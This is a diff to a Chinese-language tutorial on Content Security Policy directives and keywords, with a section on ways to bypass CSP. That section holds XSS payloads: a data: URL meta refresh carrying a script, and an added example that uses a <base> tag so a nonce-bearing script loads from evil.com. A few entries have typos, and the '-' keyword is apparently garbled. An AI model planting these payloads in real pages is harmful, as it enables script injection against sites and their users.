@@ -5,7 +5,6 @@ CSP是什么？
 ----------------------------------------
 Content Security Policy，简称 CSP。顾名思义，这个规范与内容安全有关，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。
 
-
 配置
 ----------------------------------------
 
@@ -48,41 +47,49 @@ media-src       定义 <audio>、<video> 等引用资源加载策略
 object-src      定义 <applet>、<embed>、<object> 等引用资源加载策略
 script-src      定义 JS 加载策略
 style-src       定义 CSS 加载策略
+base-uri        定义 <base> 根URL策略，不使用default-src作为默认值
 sandbox         值为 allow-forms，对资源启用 sandbox
 report-uri      值为 /report-uri，提交日志
 ============    ============
 
 关键字
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-+--------------------+----------------------------+------------------------------------------------------------------+
-| 属性值             | 示例                       | 说明                                                             |
-+====================+============================+==================================================================+
-| -                  | img-src -                  | 允许从任意url加载，除了data:blob:filesystem:schemes              |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| 'none'             | object-src 'none'          | 禁止从任何url加载资源                                            |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| 'self'             | img-src 'self'             | 只可以加载同源资源                                               |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| data:              | img-src 'self' data:       | 可以通过data协议加载资源                                         |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| domain.example.com | ing-src domain.example.com | 只可以从特定的域加载资源                                         |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| \*.example.com     | img-src \*.example.com     | 可以从任意example.com的子域处加载资源                            |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| https://cdn.com    | img-src https://cdn.com    | 只能从给定的域用https加载资源                                    |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| https:             | img-src https:             | 只能从任意域用https加载资源                                      |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| 'unsafe-inline'    | script-src 'unsafe-inline' | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
-+--------------------+----------------------------+------------------------------------------------------------------+
-| 'unsafe-eval'      | script-src 'unsafe-eval'   | 允许一些不安全的代码执行方式，例如js的eval()                     |
-+--------------------+----------------------------+------------------------------------------------------------------+
-
-- ``none``：你可能期望不匹配任何内容
-- ``self``：与当前来源相同，但不包含子域
-- ``unsafe-inline``：允许内联Javascript和CSS
-- ``unsafe-eval``：允许文本到JS的机制例如eval
+- ``-``
+    - 允许从任意url加载，除了 ``data:`` ``blob:`` ``filesystem:`` ``schemes``
+    - e.g. ``img-src -``
+- ``none``
+    - 禁止从任何url加载资源
+    - e.g. ``object-src 'none'``
+- ``self``
+    - 只可以加载同源资源
+    - e.g. ``img-src 'self'``
+- ``data:``
+    - 可以通过data协议加载资源
+    - e.g. ``img-src 'self' data:``
+- ``domain.example.com``
+    - e.g. ``img-src domain.example.com``
+    - 只可以从特定的域加载资源
+- ``\*.example.com``
+    - e.g. ``img-src \*.example.com``
+    - 可以从任意example.com的子域处加载资源
+- ``https://cdn.com``
+    - e.g. ``img-src https://cdn.com``
+    - 只能从给定的域用https加载资源
+- ``https:``
+    - e.g. ``img-src https:``
+    - 只能从任意域用https加载资源
+- ``unsafe-inline``
+    - 允许内部资源执行代码例如style attribute,onclick或者是sicript标签
+    - e.g. ``script-src 'unsafe-inline'``
+- ``unsafe-eval``
+    - 允许一些不安全的代码执行方式，例如js的eval()
+    - e.g. ``script-src 'unsafe-eval'``
+- ``nonce-<base64-value>'``
+    - 使用随机的nonce，允许加载标签上nonce属性匹配的标签
+    - e.g. ``script-src 'nonce-bm9uY2U='``
+- ``<hash-algo>-<base64-value>'``
+    - 允许hash值匹配的代码块被执行
+    - e.g. ``script-src 'sha256-<base64-value>'``
 
 配置范例
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -147,7 +154,7 @@ iframe
 其他
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - CND Bypass,如果网站信任了某个CDN, 那么可利用相应的CDN bypass
-- Angular versions <1.5.9 >=1.5.0，存在漏洞 `Git pr <https://github.com/angular/angular.js/pull/15346>`_
+- Angular versions <1.5.9 >=1.5.0，存在漏洞 `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
 - jQuery sourcemap 
     ::
 
@@ -157,4 +164,8 @@ iframe
 - For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
 - ``<link rel="import" />``
 - ``<meta http-equiv="refresh" content="0; url=http://...." />``
-- 策略配置为 ``self`` 时，可通过 ``base`` 标签修改源来bypass
+- 当script-src为nonce或无限制，且base-uri无限制时，可通过 ``base`` 标签修改根URL来bypass，如下加载了http://evil.com/main.js
+    ::
+
+        <base href="http://evil.com/">
+        <script nonce="correct value" src="/main.js"></script>
